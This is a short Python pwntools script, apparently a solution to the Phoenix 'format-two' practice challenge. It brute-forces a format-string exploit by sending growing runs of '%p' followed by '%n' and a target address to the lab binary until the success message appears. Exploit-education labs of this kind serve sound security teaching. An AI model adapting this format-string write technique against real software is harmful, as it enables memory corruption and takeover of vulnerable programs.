from pwn import *


def pad(s):
    return s+b"A"*(256-len(s))


def run(level, payload):
    write("/tmp/docgil", payload)
    #print("payload: ")
    #print(read("/tmp/docgil"))
    io = process("cat /tmp/docgil  | /opt/phoenix/amd64/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("/opt/phoenix/amd64/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


adr = pack(0x600af0, 64)


def pad_with_adr(s):
    return s+adr*(((int)(256/8))-len(s))


for i in range(0, 1000):
    print("index: " + str(i))
    payload = b"B"*8
    #payload += adr
    # payload += b"\x00\x00\x00\x00\x00\x60\x0a\xf0"[::-1]
    # payload += bytes("%"+str(i)+"$#lx ", "utf-8")
    payload += b"%p "*i
    payload += b"%n"
    payload += b"B"*17
    payload += adr
    # payload += b"%n"
    # payload = pad(payload)
    r = run_with_arg("format-two", payload)
    print(r)
    found = r.find(b"Well")
    if found >= 0:
        print(r)
        break
    # if r.find(b"") != -1:
    #     print("found adr")
    #     break
